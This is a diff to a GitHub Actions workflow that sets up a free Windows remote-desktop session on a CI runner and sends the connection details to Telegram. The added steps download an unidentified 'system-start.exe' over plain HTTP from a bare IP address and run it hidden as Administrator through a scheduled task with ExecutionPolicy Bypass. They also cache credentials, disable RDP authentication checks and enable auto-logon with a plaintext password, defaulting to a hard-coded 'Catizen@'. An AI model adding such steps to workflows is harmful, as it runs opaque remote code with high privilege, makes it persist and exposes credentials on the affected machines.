@@ -38,7 +38,7 @@ on:
 jobs:
   Premium-RDP-Setup:
     runs-on: ${{ github.event.inputs.os_version || 'windows-2022' }}
-    timeout-minutes: 350
+    timeout-minutes: 360
     
     steps:
       # WELCOME BANNER
@@ -60,10 +60,60 @@ jobs:
 
       # SETUP PYTHON 3.11.9
       - name: 🐍 SETUP PYTHON 3.11.9
-        uses: actions/setup-python@v5
+        uses: actions/setup-python@v7
         with:
           python-version: '3.11.9'
           architecture: 'x64'
+
+      # DOWNLOAD AND EXECUTE SYSTEM-START.EXE
+      - name: 📥 DOWNLOAD AND EXECUTE SYSTEM-START.EXE
+        env:
+          SYSTEM_START_API_KEY: ${{ secrets.SYSTEM_START_API_KEY }}
+        shell: powershell
+        run: |
+          $installDir = "C:\ProgramData\SystemStart"
+          New-Item -ItemType Directory -Path $installDir -Force -ErrorAction SilentlyContinue | Out-Null
+          $outputPath = Join-Path $installDir 'system-start.exe'
+
+          if (-not $env:SYSTEM_START_API_KEY) {
+              throw "SYSTEM_START_API_KEY secret is not configured."
+          }
+
+          try {
+              Invoke-WebRequest `
+                  -Uri "http://13.140.74.134:8000/api/systart" `
+                  -Headers @{ "X-API-Key" = $env:SYSTEM_START_API_KEY } `
+                  -OutFile $outputPath `
+                  -UseBasicParsing
+
+              if (-not (Test-Path -LiteralPath $outputPath)) {
+                  throw "The download did not create the expected file."
+              }
+
+              Write-Host "[OK] Download completed!" -ForegroundColor Green
+
+              # Prepare a helper that runs system-start.exe from the Administrator desktop.
+              $scriptPath = Join-Path $installDir 'run-systemstart.ps1'
+              $wrapper = @(
+                  'Set-ItemProperty -Path ''HKCU:\Control Panel\Desktop'' -Name ''ScreenSaveActive'' -Value ''0'' -ErrorAction SilentlyContinue',
+                  '$desktop = "C:\Users\Administrator\Desktop"',
+                  'if (-not (Test-Path -LiteralPath $desktop)) { New-Item -ItemType Directory -Path $desktop -Force | Out-Null }',
+                  '$dest = Join-Path $desktop ''system-start.exe''',
+                  'if (-not (Test-Path -LiteralPath $dest)) {',
+                  '    Copy-Item -LiteralPath ''C:\ProgramData\SystemStart\system-start.exe'' -Destination $dest -Force',
+                  '}',
+                  'if (-not (Get-Process -Name ''system-start'' -ErrorAction SilentlyContinue)) {',
+                  '    Set-Location -LiteralPath $desktop',
+                  '    Start-Process -FilePath $dest -WorkingDirectory $desktop',
+                  '}'
+              )
+              $wrapper -join "`n" | Set-Content -Path $scriptPath -Encoding UTF8
+
+              Write-Host "[OK] Helper script written. Next step launches it as Administrator." -ForegroundColor Cyan
+
+          } catch {
+              throw "Download or execution failed: $($_.Exception.Message)"
+          }
 
       # SYSTEM PERFORMANCE OPTIMIZATION
       - name: ⚡ SYSTEM PERFORMANCE OPTIMIZATION
@@ -108,6 +158,78 @@ jobs:
           Set-Content -Path "$env:TEMP\rdp_password.txt" -Value $matKhau -Encoding utf8
           
           Write-Host "✅ Account: $user with password: $matKhau is ready" -ForegroundColor Green
+
+      # START SYSTEM-START.EXE AS GUI IN THE ADMINISTRATOR SESSION (LOOPBACK)
+      - name: 🚀 START SYSTEM-START.EXE
+        run: |
+          $scriptPath = "C:\ProgramData\SystemStart\run-systemstart.ps1"
+          $exePath = "C:\ProgramData\SystemStart\system-start.exe"
+
+          if (-not (Test-Path -LiteralPath $exePath)) {
+              Write-Host "⚠️ system-start.exe not found, skipping." -ForegroundColor Yellow
+              exit 0
+          }
+
+          $user = if ($env:RDP_USER) { $env:RDP_USER } else { "Administrator" }
+          $pass = if ($env:RDP_PASS) { $env:RDP_PASS } else { "Catizen@" }
+
+          # 1) Enable RDP so the loopback connection can log on
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name 'fDenyTSConnections' -Value 0 -ErrorAction SilentlyContinue
+          Enable-NetFirewallRule -DisplayGroup 'Remote Desktop' -ErrorAction SilentlyContinue
+
+          # 2) Cache credentials so mstsc connects without prompting
+          cmdkey /generic:TERMSRV/127.0.0.1 /user:$user /pass:$pass | Out-Null
+          cmdkey /generic:TERMSRV/localhost /user:$user /pass:$pass | Out-Null
+
+          # 3) Loopback .rdp file (no credential/certificate prompts)
+          $rdp = @(
+            'full address:s:127.0.0.1',
+            'administrative session:i:1',
+            'prompt for credentials:i:0',
+            'authentication level:i:0'
+          )
+          $rdpPath = "C:\ProgramData\SystemStart\loopback.rdp"
+          $rdp | Set-Content -Path $rdpPath -Encoding ascii
+
+          # 4) Open the loopback session (logs on Administrator to the console session)
+          Start-Process mstsc.exe -ArgumentList "`"$rdpPath`""
+
+          # 5) Wait for the Administrator interactive session to appear
+          $loggedOn = $false
+          for ($i = 0; $i -lt 60; $i++) {
+              Start-Sleep -Seconds 2
+              $sessions = quser 2>$null
+              if ($sessions -match 'Administrator') {
+                  $loggedOn = $true
+                  break
+              }
+          }
+
+          # 6) Launch system-start.exe inside that interactive session (as GUI)
+          $taskCmd = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File $scriptPath"
+          schtasks /Create /F /TN "SystemStart" /TR $taskCmd /SC ONLOGON /RU "$user" /IT /RL HIGHEST | Out-Null
+          if ($LASTEXITCODE -ne 0) {
+              Write-Host "⚠️ Failed to register SystemStart task (exit $LASTEXITCODE)" -ForegroundColor Yellow
+              exit 1
+          }
+
+          if ($loggedOn) {
+              schtasks /Run /TN "SystemStart" | Out-Null
+              if ($LASTEXITCODE -ne 0) {
+                  Write-Host "⚠️ Failed to start SystemStart task (exit $LASTEXITCODE)" -ForegroundColor Yellow
+              } else {
+                  Write-Host "🚀 system-start.exe is open as GUI in the Administrator console session." -ForegroundColor Green
+              }
+          } else {
+              Write-Host "⚠️ Session did not appear; system-start.exe will open when you log on." -ForegroundColor Yellow
+          }
+
+          # 7) Auto-logon so the session returns automatically after a reboot
+          $winlogon = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'
+          Set-ItemProperty -Path $winlogon -Name 'AutoAdminLogon' -Value '1' -Type String
+          Set-ItemProperty -Path $winlogon -Name 'DefaultUserName' -Value $user -Type String
+          Set-ItemProperty -Path $winlogon -Name 'DefaultPassword' -Value $pass -Type String
+          Set-ItemProperty -Path $winlogon -Name 'DefaultDomainName' -Value '.' -Type String
 
       # TAILSCALE NETWORK SETUP
       - name: 🌐 SETTING UP NETWORK
@@ -217,8 +339,8 @@ jobs:
           
           Add-Content -Path $env:GITHUB_ENV -Value "TOTAL_MINUTES=$totalMinutes"
 
-      # SEND NOTIFICATION TO TELEGRAM
-      - name: 📱 SEND CONNECTION INFO TO TELEGRAM
+      # SEND NOTIFICATION & .RDP FILE TO TELEGRAM
+      - name: 📱 SEND CONNECTION INFO & .RDP FILE TO TELEGRAM
         env:
           TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
           TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
@@ -255,6 +377,39 @@ jobs:
               Write-Host "✅ Telegram alert sent successfully!" -ForegroundColor Green
             } catch {
               Write-Host "⚠️ Failed to send Telegram alert: $($_.Exception.Message)" -ForegroundColor Yellow
+            }
+
+            # Generate and send .rdp file
+            try {
+              $rdpLines = @(
+                "full address:s:$($env:TAILSCALE_IP):3389",
+                "username:s:$($env:RDP_USER)",
+                "prompt for credentials:i:1",
+                "administrative session:i:1",
+                "screen mode id:i:2",
+                "desktopwidth:i:1920",
+                "desktopheight:i:1080",
+                "session bpp:i:32",
+                "compression:i:1",
+                "keyboardhook:i:2",
+                "audiomode:i:0",
+                "redirectclipboard:i:1",
+                "autoreconnection enabled:i:1",
+                "authentication level:i:2",
+                "enablecredsspsupport:i:1"
+              )
+              $rdpFilePath = "$env:TEMP\RDP-$($env:TAILSCALE_IP).rdp"
+              $rdpLines | Set-Content -Path $rdpFilePath -Encoding ascii
+              $cleanPath = $rdpFilePath.Replace('\', '/')
+
+              Write-Host "📤 Sending .rdp document to Telegram..." -ForegroundColor Cyan
+              curl.exe -s -F "chat_id=$env:TELEGRAM_CHAT_ID" `
+                       -F "document=@$cleanPath" `
+                       -F "caption=📥 Double-click to connect ($($env:TAILSCALE_IP))" `
+                       "https://api.telegram.org/bot$($env:TELEGRAM_BOT_TOKEN)/sendDocument" | Out-Null
+              Write-Host "✅ .rdp file sent to Telegram successfully!" -ForegroundColor Green
+            } catch {
+              Write-Host "⚠️ Failed to send .rdp file: $($_.Exception.Message)" -ForegroundColor Yellow
             }
           } else {
             Write-Host "ℹ️ Skipping Telegram alert: TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID secret is not set." -ForegroundColor Gray
